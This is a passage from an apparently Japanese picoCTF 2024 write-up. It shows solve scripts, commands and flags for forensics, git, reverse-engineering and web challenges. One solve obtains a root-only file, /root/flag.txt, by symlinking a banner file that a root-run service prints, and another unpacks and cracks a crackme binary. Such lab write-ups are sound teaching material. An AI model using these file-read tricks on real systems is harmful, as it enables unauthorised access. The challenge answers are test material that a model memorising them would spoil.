</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def decrypt(cipher, key):
</span><span style="color:#d4be98;">    plain = &quot;&quot;
</span><span style="color:#d4be98;">    for char in cipher:
</span><span style="color:#d4be98;">        p = (char // 311) // key
</span><span style="color:#d4be98;">        plain += chr(p)
</span><span style="color:#d4be98;">    return plain
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def semi_decrypt(cipher, key):
</span><span style="color:#d4be98;">    cipher_list = list(cipher)
</span><span style="color:#d4be98;">    cipher_list.reverse()
</span><span style="color:#d4be98;">    cipher = &quot;&quot;.join(cipher_list)
</span><span style="color:#d4be98;">    plain = &quot;&quot;
</span><span style="color:#d4be98;">    key_length = len(key)
</span><span style="color:#d4be98;">    for i, char in enumerate(cipher[::-1]):
</span><span style="color:#d4be98;">        key_char = key[i % key_length]
</span><span style="color:#d4be98;">        print(f&quot;key_char: &#123;ord(key_char)&#125;&quot;)
</span><span style="color:#d4be98;">        print(f&quot;ec: &#123;ord(char)&#125;&quot;)
</span><span style="color:#d4be98;">        decrypted_char = chr(ord(char) ^ ord(key_char))
</span><span style="color:#d4be98;">        print(f&quot;decrypted_char: &#123;ord(decrypted_char)&#125;&quot;)
</span><span style="color:#d4be98;">        plain += decrypted_char
</span><span style="color:#d4be98;">    return plain
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">a = 94
</span><span style="color:#d4be98;">b = 29
</span><span style="color:#d4be98;">cipher = [
</span><span style="color:#d4be98;">    260307,
</span><span style="color:#d4be98;">    491691,
</span><span style="color:#d4be98;">    491691,
</span><span style="color:#d4be98;">    2487378,
</span><span style="color:#d4be98;">    2516301,
</span><span style="color:#d4be98;">    0,
</span><span style="color:#d4be98;">    1966764,
</span><span style="color:#d4be98;">    1879995,
</span><span style="color:#d4be98;">    1995687,
</span><span style="color:#d4be98;">    1214766,
</span><span style="color:#d4be98;">    0,
</span><span style="color:#d4be98;">    2400609,
</span><span style="color:#d4be98;">    607383,
</span><span style="color:#d4be98;">    144615,
</span><span style="color:#d4be98;">    1966764,
</span><span style="color:#d4be98;">    0,
</span><span style="color:#d4be98;">    636306,
</span><span style="color:#d4be98;">    2487378,
</span><span style="color:#d4be98;">    28923,
</span><span style="color:#d4be98;">    1793226,
</span><span style="color:#d4be98;">    694152,
</span><span style="color:#d4be98;">    780921,
</span><span style="color:#d4be98;">    173538,
</span><span style="color:#d4be98;">    173538,
</span><span style="color:#d4be98;">    491691,
</span><span style="color:#d4be98;">    173538,
</span><span style="color:#d4be98;">    751998,
</span><span style="color:#d4be98;">    1475073,
</span><span style="color:#d4be98;">    925536,
</span><span style="color:#d4be98;">    1417227,
</span><span style="color:#d4be98;">    751998,
</span><span style="color:#d4be98;">    202461,
</span><span style="color:#d4be98;">    347076,
</span><span style="color:#d4be98;">    491691,
</span><span style="color:#d4be98;">]
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">p = 97
</span><span style="color:#d4be98;">g = 31
</span><span style="color:#d4be98;">text_key = &quot;trudeau&quot;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">u = generator(g, a, p)
</span><span style="color:#d4be98;">v = generator(g, b, p)
</span><span style="color:#d4be98;">key = generator(v, a, p)
</span><span style="color:#d4be98;">b_key = generator(u, b, p)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">shared_key = None
</span><span style="color:#d4be98;">if key == b_key:
</span><span style="color:#d4be98;">    shared_key = key
</span><span style="color:#d4be98;">else:
</span><span style="color:#d4be98;">    print(&quot;Invalid key&quot;)
</span><span style="color:#d4be98;">    exit()
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">semi_cipher = decrypt(cipher, shared_key)
</span><span style="color:#d4be98;">plain = semi_decrypt(semi_cipher, text_key)
</span><span style="color:#d4be98;">plain_list = list(plain)
</span><span style="color:#d4be98;">plain_list.reverse()
</span><span style="color:#d4be98;">print(&quot;&quot;.join(plain_list))
</span></code></pre>
<h1>Forensic</h1>
<h2>scan surprise</h2>
<p>QRコードを渡されたので素直に読み取る。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;p33k_@_b00_a81f0a35&#125;
</span></code></pre>
<h2>verify</h2>
<p>sshでアクセスするとホームディレクトリにはこんなファイル群を含むdrop-inというディレクトリがあった。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">.
</span><span style="color:#d4be98;">./checksum.txt
</span><span style="color:#d4be98;">./decrypt.sh
</span><span style="color:#d4be98;">./files
</span><span style="color:#d4be98;">./files/00011a60
</span><span style="color:#d4be98;">./files/022cvpdN
</span><span style="color:#d4be98;">./files/04nLilRD
</span><span style="color:#d4be98;">./files/0MT2Wrui
</span><span style="color:#d4be98;">...他にもたくさん
</span></code></pre>
<p>files内のファイルのどれかをdecrypt.shで復元すれば良さそう。
仲間はずれ探しをしてみる。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">file $(find .)
</span></code></pre>
<p>そうすると仲間はずれが見つかった。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">./00011a60: openssl enc&#39;d data with salted password
</span><span style="color:#d4be98;">./022cvpdN: ASCII text
</span><span style="color:#d4be98;">./04nLilRD: ASCII text
</span><span style="color:#d4be98;">./0MT2Wrui: Motorola S-Record; binary data in text format
</span><span style="color:#d4be98;">./0SGMttmR: ASCII text
</span><span style="color:#d4be98;">./0fCDySFB: ASCII text
</span><span style="color:#d4be98;">./0hHVJSPh: ASCII text
</span><span style="color:#d4be98;">...他にもたくさん
</span></code></pre>
<p>一番始めを解読してみるとフラグを獲得できた。</p>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">./decrypt.sh files/00011a60
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;trust_but_verify_00011a60&#125;
</span></code></pre>
<h2>canyousee</h2>
<p><code>ukn_reality.jpg</code>というjpgファイルを渡された。exiftoolでメタデータを見てみる。</p>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">exiftool ukn_reality.jpg
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">ExifTool Version Number         : 12.76
</span><span style="color:#d4be98;">File Name                       : ukn_reality.jpg
</span><span style="color:#d4be98;">Directory                       : .
</span><span style="color:#d4be98;">File Size                       : 2.3 MB
</span><span style="color:#d4be98;">File Modification Date/Time     : 2024:02:16 07:40:21+09:00
</span><span style="color:#d4be98;">File Access Date/Time           : 2024:04:07 16:19:07+09:00
</span><span style="color:#d4be98;">File Inode Change Date/Time     : 2024:03:13 16:15:33+09:00
</span><span style="color:#d4be98;">File Permissions                : -rw-r--r--
</span><span style="color:#d4be98;">File Type                       : JPEG
</span><span style="color:#d4be98;">File Type Extension             : jpg
</span><span style="color:#d4be98;">MIME Type                       : image/jpeg
</span><span style="color:#d4be98;">JFIF Version                    : 1.01
</span><span style="color:#d4be98;">Resolution Unit                 : inches
</span><span style="color:#d4be98;">X Resolution                    : 72
</span><span style="color:#d4be98;">Y Resolution                    : 72
</span><span style="color:#d4be98;">XMP Toolkit                     : Image::ExifTool 11.88
</span><span style="color:#d4be98;">Attribution URL                 : cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg==
</span><span style="color:#d4be98;">Image Width                     : 4308
</span><span style="color:#d4be98;">Image Height                    : 2875
</span><span style="color:#d4be98;">Encoding Process                : Baseline DCT, Huffman coding
</span><span style="color:#d4be98;">Bits Per Sample                 : 8
</span><span style="color:#d4be98;">Color Components                : 3
</span><span style="color:#d4be98;">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
</span><span style="color:#d4be98;">Image Size                      : 4308x2875
</span><span style="color:#d4be98;">Megapixels                      : 12.4
</span></code></pre>
<p>怪しいbase64っぽい文字列が見えたのでデコードしてみる。</p>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">echo cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg== | base64 -d
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;ME74D47A_HIDD3N_a6df8db8&#125;
</span></code></pre>
<h2>secret of the polyglot</h2>
<p><code>flag2of2-final.pdf</code>というpdfファイルが渡された。<code>file</code>で調べるとこのファイルはpngらしい。<a href="https://artifacts.picoctf.net/c_titan/96/flag2of2-final.pdf">pdfとして開いてみると</a>、フラグの後半が獲得できる。
pngとして開いてみると前半が手に入る。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;f1u3n7_1n_pn9_&amp;_pdf_90974127&#125;
</span></code></pre>
<h2>mob psycho</h2>
<p>apkファイルが渡されたのでapktoolで展開してみる。
この後いろいろ探したのだが、手がかりが見つからなかった。
よって、展開の各段階ごと調べていく。
まずはunzipしてdexファイル群の段階にする。そのこのファイル群を調べていたら、<code>res/color/flag.txt</code>を見つけた。</p>
<h2>endianness-v2</h2>
<p>謎のバイナリデータを渡された。問題文に、32bitシステム上から取得されたデータであると書いてあったので、メモリダンプだと予想し、データを4バイトずつ反転してみることにした。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">with open(&quot;./file&quot;, &quot;rb&quot;) as f:
</span><span style="color:#d4be98;">    data = list(f.read())
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">output = []
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">print(len(data))
</span><span style="color:#d4be98;">for i in range(0, len(data) // 4, 1):
</span><span style="color:#d4be98;">    each = data[i * 4 : i * 4 + 4]
</span><span style="color:#d4be98;">    each.reverse()
</span><span style="color:#d4be98;">    for j in each:
</span><span style="color:#d4be98;">        output.append(j)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">with open(&quot;./file.out&quot;, &quot;wb&quot;) as f:
</span><span style="color:#d4be98;">    f.write(bytes(output))
</span></code></pre>
<p>予想通りメモリダンプだった。デコードした結果フラグが写ったjpegファイルが生成された。</p>
<h1>General Skills</h1>
<h2>super ssh</h2>
<p>sshサーバーにアクセスしたらフラグが出力されて通信が切れた。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">ssh -p 53176 ctf-player@titan.picoctf.net
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">ctf-player@titan.picoctf.net&#39;s password:
</span><span style="color:#d4be98;">Welcome ctf-player, here&#39;s your flag: picoCTF&#123;s3cur3_c0nn3ct10n_8969f7d3&#125;
</span><span style="color:#d4be98;">Connection to titan.picoctf.net closed.
</span></code></pre>
<h2>commitment issues</h2>
<p>gitリポジトリが配られた。
とりあえずログを見る。</p>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">git log
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">commit e1237df82d2e69f62dd53279abc1c8aeb66f6d64 (HEAD -&gt; master)
</span><span style="color:#d4be98;">Author: picoCTF &lt;ops@picoctf.com&gt;
</span><span style="color:#d4be98;">Date:   Sat Mar 9 21:10:14 2024 +0000
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    remove sensitive info
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">commit 3d5ec8a26ee7b092a1760fea18f384c35e435139
</span><span style="color:#d4be98;">Author: picoCTF &lt;ops@picoctf.com&gt;
</span><span style="color:#d4be98;">Date:   Sat Mar 9 21:10:14 2024 +0000
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    create flag
</span></code></pre>
<p><code>3d5ec8a26ee7b092a1760fea18f384c35e435139</code>このコミットでフラグが作られたらしい。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">git checkout 3d5ec8a26ee7b092a1760fea18f384c35e435139
</span><span style="color:#d4be98;">cat message.txt
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;s@n1t1z3_30e86d36&#125;
</span></code></pre>
<h2>time machine</h2>
<p>gitリポジトリが配られた。logを見たら、メッセージがフラグのコミットがあった。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">git log
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">commit 705ff639b7846418603a3272ab54536e01e3dc43 (HEAD -&gt; master)
</span><span style="color:#d4be98;">Author: picoCTF &lt;ops@picoctf.com&gt;
</span><span style="color:#d4be98;">Date:   Sat Mar 9 21:10:36 2024 +0000
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    picoCTF&#123;t1m3m@ch1n3_b476ca06&#125;
</span></code></pre>
<h2>blame game</h2>
<p>gitリポジトリが配られた。logを見たらフラグがコミットしていた。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">git log
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">...他にもたくさん
</span><span style="color:#d4be98;">commit ccf857444761e8380204eafd76e677f9e7e71a94
</span><span style="color:#d4be98;">Author: picoCTF &lt;ops@picoctf.com&gt;
</span><span style="color:#d4be98;">Date:   Sat Mar 9 21:09:25 2024 +0000
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    important business work
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">commit 0fe87f16cbd8129ed5f7cf2f6a06af6688665728
</span><span style="color:#d4be98;">Author: picoCTF&#123;@sk_th3_1nt3rn_ea346835&#125; &lt;ops@picoctf.com&gt;
</span><span style="color:#d4be98;">Date:   Sat Mar 9 21:09:25 2024 +0000
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    optimize file size of prod code
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">commit 7e8a2415b6cca7d0d0002ff0293dd384b5cc900d
</span><span style="color:#d4be98;">Author: picoCTF &lt;ops@picoctf.com&gt;
</span><span style="color:#d4be98;">Date:   Sat Mar 9 21:09:25 2024 +0000
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    create top secret project
</span></code></pre>
<h2>collaborative development</h2>
<p>gitリポジトリが配られた。怪しげなブランチがあった。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">git branch --list
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">* (HEAD detached at 74ae521)
</span><span style="color:#d4be98;">  feature/part-1
</span><span style="color:#d4be98;">  feature/part-2
</span><span style="color:#d4be98;">  feature/part-3
</span><span style="color:#d4be98;">  main
</span></code></pre>
<p>part-1、part-2、part-3で得られる文字列をつなげたらフラグが得られた。
feature/part-1:</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">print(&quot;Printing the flag...&quot;)
</span><span style="color:#d4be98;">print(&quot;picoCTF&#123;t3@mw0rk_&quot;, end=&#39;&#39;)
</span></code></pre>
<p>feature/part-2</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">print(&quot;Printing the flag...&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">print(&quot;m@k3s_th3_dr3@m_&quot;, end=&#39;&#39;)
</span></code></pre>
<p>feature/part-3</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">print(&quot;Printing the flag...&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">print(&quot;w0rk_4c24302f&#125;&quot;)
</span></code></pre>
<p>つなげると</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;t3@mw0rk_m@k3s_th3_dr3@m_w0rk_4c24302f&#125;
</span></code></pre>
<h2>binhexa</h2>
<p>サーバーにアクセスしたら、ビット演算クイズがいくつか出題された。全部正解したらフラグが得られた。</p>
<h2>binary search</h2>
<p>範囲が0~1000までのランダムな値を二分探索で当てる問題。数字を渡すことでその数字が正解の数字よりも大きいか小さいかを教えてくれる。この試行は10回だけできる。
インタラクティブシェルで以下のような関数を定義すると便利。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">def m(x,y):
</span><span style="color:#d4be98;">     return (x+y)//2
</span></code></pre>
<h2>endianness</h2>
<p>与えられた文字列を指定されたエンディアンに直して、その16進数文字列を渡せばよい。</p>
<h2>dont-you-love-banners</h2>
<p>２つのサーバーが立ち上がり、一つにアクセスすると以下のようにパスワードを得られた。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">nc tethys.picoctf.net 58148
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
</span></code></pre>
<p>次にもう一つのサーバーにアクセスしてさっきリークしたパスワードを入力する。
そうするといくつかのサイバーセキュリティ業界に関するクイズが出題された。
クイズに全て正解するとシェルを得られた。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;"> nc tethys.picoctf.net 50699
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">*************************************
</span><span style="color:#d4be98;">**************WELCOME****************
</span><span style="color:#d4be98;">*************************************
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">what is the password?
</span><span style="color:#d4be98;">My_Passw@rd_@1234
</span><span style="color:#d4be98;">What is the top cyber security conference in the world?
</span><span style="color:#d4be98;">defcon
</span><span style="color:#d4be98;">the first hacker ever was known for phreaking(making free phone calls), who was it?
</span><span style="color:#d4be98;">John Draper
</span><span style="color:#d4be98;">player@challenge:~$ ls banner
</span><span style="color:#d4be98;">*************************************
</span><span style="color:#d4be98;">**************WELCOME****************
</span><span style="color:#d4be98;">*************************************
</span></code></pre>
<p>サーバーを探索すると<code>/root/flag.txt</code>を見つけたが権限不足で中身を見ることはできなかった。
しかし、ホームディレクトリにあった<code>banner</code>ファイル内の文字列がサーバーアクセス時に出力されていそうなことと、<code>ps aux</code>の結果から、プログラムがroot権限で実行されていることがわかった。だから<code>banner</code>を<code>/root/flag.txt</code>へのシンボリックリンクに設定することでもう一度サーバーにアクセスしたときにフラグが出力されるようにできた。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;"> nc tethys.picoctf.net 50699
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">what is the password?
</span></code></pre>
<h1>Reverse Engineering</h1>
<h2>packer</h2>
<p><code>out</code>という実行ファイルが配られた。問題名からパッキングされてそうだと推測した。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">strings out
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">...他にもたくさん
</span><span style="color:#d4be98;">.bssh
</span><span style="color:#d4be98;">?p! _
</span><span style="color:#d4be98;">H_db
</span><span style="color:#d4be98;">UPX!
</span><span style="color:#d4be98;">UPX!
</span></code></pre>
<p>stringsでみたらUPXでパッキングされていることがわかった。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">upx -d out
</span></code></pre>
<p>デパッキングしてstringsでフラグを探してみたが見つからないので、gdbでプログラムの実行を追ってみる。
ディスアセンブルすると怪しげなメモリ書き込みが見つかったので、全て書き込まれた段階でそのメモリを見てみる。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">...省略
</span><span style="color:#d4be98;">0x0000000000401e33 &lt;+206&gt;:   mov    QWORD PTR [rbp-0x88],rax
</span><span style="color:#d4be98;">0x0000000000401e3a &lt;+213&gt;:   movabs rax,0x6636333639363037
</span><span style="color:#d4be98;">0x0000000000401e44 &lt;+223&gt;:   movabs rdx,0x6237363434353334
</span><span style="color:#d4be98;">0x0000000000401e4e &lt;+233&gt;:   mov    QWORD PTR [rbp-0x80],rax
</span><span style="color:#d4be98;">0x0000000000401e52 &lt;+237&gt;:   mov    QWORD PTR [rbp-0x78],rdx
</span><span style="color:#d4be98;">0x0000000000401e56 &lt;+241&gt;:   movabs rax,0x6635383539333535
</span><span style="color:#d4be98;">0x0000000000401e60 &lt;+251&gt;:   movabs rdx,0x3433303565363535
</span><span style="color:#d4be98;">0x0000000000401e6a &lt;+261&gt;:   mov    QWORD PTR [rbp-0x70],rax
</span><span style="color:#d4be98;">0x0000000000401e6e &lt;+265&gt;:   mov    QWORD PTR [rbp-0x68],rdx
</span><span style="color:#d4be98;">0x0000000000401e72 &lt;+269&gt;:   movabs rax,0x6534313362363336
</span><span style="color:#d4be98;">0x0000000000401e7c &lt;+279&gt;:   movabs rdx,0x3133323466353633
</span><span style="color:#d4be98;">0x0000000000401e86 &lt;+289&gt;:   mov    QWORD PTR [rbp-0x60],rax
</span><span style="color:#d4be98;">0x0000000000401e8a &lt;+293&gt;:   mov    QWORD PTR [rbp-0x58],rdx
</span><span style="color:#d4be98;">0x0000000000401e8e &lt;+297&gt;:   movabs rax,0x3936323534336536
</span><span style="color:#d4be98;">0x0000000000401e98 &lt;+307&gt;:   movabs rdx,0x3333663533353333
</span><span style="color:#d4be98;">0x0000000000401ea2 &lt;+317&gt;:   mov    QWORD PTR [rbp-0x50],rax
</span><span style="color:#d4be98;">0x0000000000401ea6 &lt;+321&gt;:   mov    QWORD PTR [rbp-0x48],rdx
</span><span style="color:#d4be98;">0x0000000000401eaa &lt;+325&gt;:   movabs rax,0x3136313631333733
</span><span style="color:#d4be98;">0x0000000000401eb4 &lt;+335&gt;:   movabs rdx,0x6437363636363933
</span><span style="color:#d4be98;">0x0000000000401ebe &lt;+345&gt;:   mov    QWORD PTR [rbp-0x40],rax
</span><span style="color:#d4be98;">0x0000000000401ec2 &lt;+349&gt;:   mov    QWORD PTR [rbp-0x38],rdx
</span><span style="color:#d4be98;">0x0000000000401ec6 &lt;+353&gt;:   mov    QWORD PTR [rbp-0x30],0x0
</span><span style="color:#d4be98;">...省略
</span><span style="color:#d4be98;">pwndbg&gt; x/sb $rbp-0x80
</span><span style="color:#d4be98;">0x7fffffffdfa0: &quot;7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667dX\341\377\377\377\177&quot;
</span></code></pre>
<p><code>7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667d</code>をasciiに変換すればフラグが得られた。<code>picoCTF&#123;U9X_UnP4ck1N6_B1n4Ri3S_371aa9ff&#125;</code></p>
<h2>factcheck</h2>
<p><code>bin</code>という実行ファイルを渡された。
stringsでフラグを探したが、</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">strings bin | grep pico
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;wELF_d0N3_mate_
</span></code></pre>
<p>一部しか見つからなかったのででコンパイルした。
コンパイルしてもあんまり意味がわからなかったのだが、どこかの領域に<code>picoCTF&#123;wELF_d0N3_mate_</code>を書き込んだ後に、長い処理を行っていたのでgdbで処理を追ってみることにした。フラグが書き込まれた領域を監視しながら<code>main</code>の処理を一つずつ実行していったらフラグを得ることができた。<code>picoCTF&#123;wELF_d0N3_mate_e9da2c0e&#125;</code></p>
<h2>classic crackme 0x100</h2>
<p>配られた<code>crackme100</code>をデコンパイルして簡略化すると以下のようになる</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">for i in range(3):
</span><span style="color:#d4be98;">  for j in range(length) &#123;
</span><span style="color:#d4be98;">    local_28 = (j % 0xFF &gt;&gt; 1 &amp; 85) + (j % 0xFF &amp; 85)
</span><span style="color:#d4be98;">    local_2c = (local_28 &gt;&gt; 2 &amp; 51) + (51 &amp; local_28)
</span><span style="color:#d4be98;">	
</span><span style="color:#d4be98;">	A = local_2c &gt;&gt; 4 &amp; 15
</span><span style="color:#d4be98;">    B = 15 &amp; local_2c
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">	iVar1 = A + ord(input[j]) - 97 + B
</span><span style="color:#d4be98;">    input[j] = chr(97 + iVar1 % 0x1A)
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">if input == &quot;lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw&quot;:
</span><span style="color:#d4be98;">  print(&quot;flag&#123;hello!&#125;&quot;)
</span></code></pre>
<p>よく見ると<code>local_2c</code>は<code>local_28</code>にのみ依存していて、<code>local_28</code>は<code>j</code>のみに依存している。よって、<code>local_2c</code>と<code>local_28</code>はそのまま解読スクリプトに組み込めば良い。
次にiVar1を特定したい。<code>input[j] = chr(ord(&quot;a&quot;) + iVar1 % 0x1A)</code>より、
<code>iVar1 % 0x1A = input[j] - 97</code>であるから、0x1Aで割ったあまりが<code>input[j] - 97</code>と等しくなるまで総当りしてiVar1を求める。iVar1を求めることができれば、もともとのinput[j]も単純な式変形だけで求めることができる。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">passwd = &quot;lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw&quot;
</span><span style="color:#d4be98;">length = len(passwd)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def encode(lst: list):
</span><span style="color:#d4be98;">    for i in range(3):
</span><span style="color:#d4be98;">        for j in range(length):
</span><span style="color:#d4be98;">            local_28 = (j % 0xFF &gt;&gt; 1 &amp; 85) + (j % 0xFF &amp; 85)
</span><span style="color:#d4be98;">            local_2c = (local_28 &gt;&gt; 2 &amp; 51) + (51 &amp; local_28)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">            A = local_2c &gt;&gt; 4 &amp; 15
</span><span style="color:#d4be98;">            B = 15 &amp; local_2c
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">            iVar1 = A + ord(lst[j]) - 97 + B
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">            lst[j] = chr(ord(&quot;a&quot;) + iVar1 % 0x1A)
</span><span style="color:#d4be98;">    return &quot;&quot;.join(lst)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def decode(lst: list):
</span><span style="color:#d4be98;">    for i in range(3):
</span><span style="color:#d4be98;">        for j in range(length):
</span><span style="color:#d4be98;">            local_28 = (j % 0xFF &gt;&gt; 1 &amp; 85) + (j % 0xFF &amp; 85)
</span><span style="color:#d4be98;">            local_2c = (local_28 &gt;&gt; 2 &amp; 51) + (51 &amp; local_28)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">            A = local_2c &gt;&gt; 4 &amp; 15
</span><span style="color:#d4be98;">            B = 15 &amp; local_2c
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">            enc = ord(lst[j])
</span><span style="color:#d4be98;">            for x in range(97, 123):
</span><span style="color:#d4be98;">                if (enc - 97) == (A + B + x - 97) % 26:
</span><span style="color:#d4be98;">                    lst[j] = chr(x)
</span><span style="color:#d4be98;">    return &quot;&quot;.join(lst)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">print(decode(list(passwd)))
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">./solve.py | ./crackme100
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">Enter the secret password: SUCCESS! Here is your flag: picoCTF&#123;sample_flag&#125;
</span></code></pre>
<h1>Web Exploitation</h1>
<h2>bookmarklet</h2>
<p>サイトにアクセスしてコピーできるjavascriptコードを開発者ツールのConsoleで実行するとフラグを得られる。</p>
<h2>webdecode</h2>
<p>ソースコードを調査した結果<code>/about.html</code>に怪しげなタグを見つけた。</p>
<pre style="background-color:#292828;"><code class="language-html"><span style="color:#d4be98;">&lt;!DOCTYPE html&gt;
</span><span style="color:#d4be98;">&lt;html lang=&quot;en&quot;&gt;
</span><span style="color:#d4be98;"> &lt;head&gt;
</span><span style="color:#d4be98;">  &lt;meta charset=&quot;utf-8&quot;/&gt;
</span><span style="color:#d4be98;">  &lt;meta content=&quot;IE=edge&quot; http-equiv=&quot;X-UA-Compatible&quot;/&gt;
</span><span style="color:#d4be98;">  &lt;meta content=&quot;width=device-width, initial-scale=1.0&quot; name=&quot;viewport&quot;/&gt;
</span><span style="color:#d4be98;">  &lt;link href=&quot;[style.css](view-source:http://titan.picoctf.net:54581/style.css)&quot; rel=&quot;stylesheet&quot;/&gt;
</span><span style="color:#d4be98;">  &lt;link href=&quot;[img/favicon.png](view-source:http://titan.picoctf.net:54581/img/favicon.png)&quot; rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot;/&gt;
</span><span style="color:#d4be98;">  &lt;!-- font (google) --&gt;
</span><span style="color:#d4be98;">  &lt;link href=&quot;[https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400&amp;amp;display=swap](view-source:https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400&amp;display=swap)&quot; rel=&quot;stylesheet&quot;/&gt;
</span><span style="color:#d4be98;">  &lt;title&gt;
</span><span style="color:#d4be98;">   About me
</span><span style="color:#d4be98;">  &lt;/title&gt;
</span><span style="color:#d4be98;"> &lt;/head&gt;
</span><span style="color:#d4be98;"> &lt;body&gt;
</span><span style="color:#d4be98;">  &lt;header&gt;
</span><span style="color:#d4be98;">   &lt;nav&gt;
</span><span style="color:#d4be98;">    &lt;div class=&quot;logo-container&quot;&gt;
</span><span style="color:#d4be98;">     &lt;a href=&quot;[index.html](view-source:http://titan.picoctf.net:54581/index.html)&quot;&gt;
